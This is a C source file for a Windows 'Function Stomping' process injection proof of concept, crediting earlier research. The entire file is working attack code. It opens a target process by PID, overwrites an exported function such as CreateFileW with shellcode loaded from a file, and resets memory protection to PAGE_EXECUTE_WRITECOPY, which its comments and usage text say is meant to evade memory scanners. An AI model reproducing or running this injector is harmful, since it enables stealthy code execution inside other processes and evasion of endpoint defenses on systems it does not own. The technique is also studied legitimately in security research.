#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Psapi.lib")

typedef struct {
    const wchar_t* moduleName;
    const char* functionName;
    LPVOID functionAddress;
} FunctionInfo;

LPVOID GetFunctionBase(HANDLE hProcess, const wchar_t* moduleName, const char* functionName) {
    BOOL result;
    DWORD moduleListSize;
    LPVOID functionBase = NULL;

    // Get size for module list
    result = EnumProcessModules(hProcess, NULL, 0, &moduleListSize);
    if (!result) {
        printf("[-] Failed to get buffer size for EnumProcessModules: %lu\n", GetLastError());
        return NULL;
    }

    // Allocate buffer for module list
    HMODULE* moduleList = (HMODULE*)malloc(moduleListSize);
    if (moduleList == NULL) {
        printf("[-] Failed to allocate memory for module list\n");
        return NULL;
    }
    memset(moduleList, 0, moduleListSize);

    // Enumerate modules
    result = EnumProcessModules(hProcess, moduleList, moduleListSize, &moduleListSize);
    if (!result) {
        // Retry once
        result = EnumProcessModules(hProcess, moduleList, moduleListSize, &moduleListSize);
        if (!result) {
            printf("[-] Failed to enumerate process modules: %lu\n", GetLastError());
            free(moduleList);
            return NULL;
        }
    }

    // Iterate through modules
    DWORD moduleCount = moduleListSize / sizeof(HMODULE);
    for (DWORD i = 0; i < moduleCount; i++) {
        HMODULE currentModule = moduleList[i];
        wchar_t currentModuleName[MAX_PATH];
        memset(currentModuleName, 0, sizeof(currentModuleName));

        // Get module name
        if (GetModuleFileNameExW(hProcess, currentModule, currentModuleName, MAX_PATH - 1) == 0) {
            continue;
        }

        // Check if this is the module we're looking for
        if (StrStrIW(currentModuleName, moduleName) != NULL) {
            // Get function address
            functionBase = (LPVOID)GetProcAddress(currentModule, functionName);
            if (functionBase == NULL) {
                printf("[-] Function '%s' not found in module '%S'\n", functionName, moduleName);
                printf("[-] This function may be unstompable or misspelled\n");
                SetLastError(126); // ERROR_MOD_NOT_FOUND
            }
            break;
        }
    }

    free(moduleList);
    return functionBase;
}

BOOL FunctionStomping(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize,
                      const wchar_t* moduleName, const char* functionName) {
    printf("\n[+] Function Stomping Injection\n");
    printf("[+] Target PID: %lu\n", pid);
    printf("[+] Target Module: %S\n", moduleName);
    printf("[+] Target Function: %s\n", functionName);
    printf("[+] Shellcode size: %zu bytes\n", shellcodeSize);

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open process: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Opened target process\n");

    // Get function base address
    LPVOID functionBase = GetFunctionBase(hProcess, moduleName, functionName);
    if (functionBase == NULL) {
        DWORD lastError = GetLastError();
        if (lastError == 126) {
            printf("[-] Function name is misspelled or the function is unstompable\n");
        }
        else {
            printf("[-] Failed to get function address: %lu\n", lastError);
        }
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Function base address: %p\n", functionBase);

    // Verify shellcode size
    // Read a small portion to check if we can access it
    BYTE testBuffer[16];
    if (!ReadProcessMemory(hProcess, functionBase, testBuffer, sizeof(testBuffer), NULL)) {
        printf("[-] Failed to read function memory: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Change protection to RW
    DWORD oldProtection;
    if (!VirtualProtectEx(hProcess, functionBase, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtection)) {
        printf("[-] Failed to change protection to RW: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Changed protection to RW\n");

    // Write shellcode
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, functionBase, shellcode, shellcodeSize, &bytesWritten)) {
        printf("[-] Failed to write shellcode: %lu\n", GetLastError());
        VirtualProtectEx(hProcess, functionBase, shellcodeSize, oldProtection, &oldProtection);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Successfully stomped the function! (%zu bytes written)\n", bytesWritten);

    // Change protection to EXECUTE_WRITECOPY to evade injection scanners
    // Reference: https://www.cyberark.com/resources/threat-research-blog/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners
    if (!VirtualProtectEx(hProcess, functionBase, shellcodeSize, PAGE_EXECUTE_WRITECOPY, &oldProtection)) {
        printf("[-] Failed to change protection to WCX: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Changed protection to WCX (EXECUTE_WRITECOPY)\n");

    printf("\n[+] Function stomping successful!\n");
    printf("[!] You MUST call the function '%s' from the target process to trigger execution!\n", functionName);
    printf("[!] Example: If you stomped CreateFileW, the target must call CreateFileW to execute shellcode.\n");

    CloseHandle(hProcess);
    return TRUE;
}

unsigned char* ReadShellcodeFromFile(const char* filename, SIZE_T* shellcodeSize) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        printf("[-] Failed to open shellcode file: %s\n", filename);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *shellcodeSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* shellcode = (unsigned char*)malloc(*shellcodeSize);
    if (shellcode == NULL) {
        printf("[-] Failed to allocate memory for shellcode\n");
        fclose(file);
        return NULL;
    }

    size_t bytesRead = fread(shellcode, 1, *shellcodeSize, file);
    if (bytesRead != *shellcodeSize) {
        printf("[-] Failed to read shellcode file\n");
        free(shellcode);
        fclose(file);
        return NULL;
    }

    fclose(file);
    printf("[+] Loaded shellcode: %zu bytes\n", *shellcodeSize);
    return shellcode;
}

int main(int argc, char* argv[]) {
    printf("[+] Function Stomping Injection POC\n");
    printf("[+] Inspired by Module Stomping\n");
    printf("[+] Original Research: Ido Veltzman (@Idov31)\n\n");

    if (argc != 5) {
        printf("Usage: %s <pid> <shellcode.bin> <module_name> <function_name>\n", argv[0]);
        printf("\n");
        printf("Examples:\n");
        printf("  %s 1234 calc_shellcode.bin kernel32.dll CreateFileW\n", argv[0]);
        printf("  %s 1234 calc_shellcode.bin kernel32.dll CreateFileA\n", argv[0]);
        printf("  %s 1234 calc_shellcode.bin user32.dll MessageBoxW\n", argv[0]);
        printf("\n");
        printf("Notes:\n");
        printf("  - Function must be called by target process to trigger execution\n");
        printf("  - Not all functions are stompable (must be large enough)\n");
        printf("  - Shellcode size must not exceed function size\n");
        printf("  - Uses PAGE_EXECUTE_WRITECOPY to evade memory scanners\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    if (pid == 0) {
        printf("[-] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    // Convert module name to wide string
    size_t moduleNameLen = strlen(argv[3]) + 1;
    wchar_t* moduleName = (wchar_t*)malloc(moduleNameLen * sizeof(wchar_t));
    if (moduleName == NULL) {
        printf("[-] Failed to allocate memory for module name\n");
        return 1;
    }
    mbstowcs(moduleName, argv[3], moduleNameLen);

    const char* functionName = argv[4];

    SIZE_T shellcodeSize;
    unsigned char* shellcode = ReadShellcodeFromFile(argv[2], &shellcodeSize);
    if (shellcode == NULL) {
        free(moduleName);
        return 1;
    }

    BOOL success = FunctionStomping(pid, shellcode, shellcodeSize, moduleName, functionName);

    free(shellcode);
    free(moduleName);

    if (success) {
        printf("\n[+] Injection successful!\n");
        return 0;
    }
    else {
        printf("\n[-] Injection failed!\n");
        return 1;
    }
}
